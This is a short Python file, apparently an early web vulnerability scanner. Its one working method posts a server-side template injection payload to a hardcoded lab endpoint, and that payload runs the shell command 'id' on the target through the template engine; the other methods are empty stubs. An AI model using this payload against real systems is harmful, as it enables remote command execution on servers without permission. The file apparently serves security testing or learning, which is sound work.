import requests
import json

class Scanner:
    def __init__(self):
        """value to be tested such as payload and web url; planned to be dynamically inserted by user from command line;
        for now will be hardcoded"""
        self.url = "http://10.10.5.130:8000/api/sstivuln"
        self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
        

class Injection(Scanner):
    def ssti(self):
        request_body = {"mathexp": self.ssti_payload}
        response = requests.post(self.url, json=request_body, timeout=10)
        print(response.text)
    
    def xss(self):
        pass

    def sqli(self):
        pass

class BrokenAccessControl(Scanner):
    def lfi(self):
        pass

    def rfi(self):
        pass

if __name__ == "__main__":
    injection_client = Injection()
    injection_client.ssti()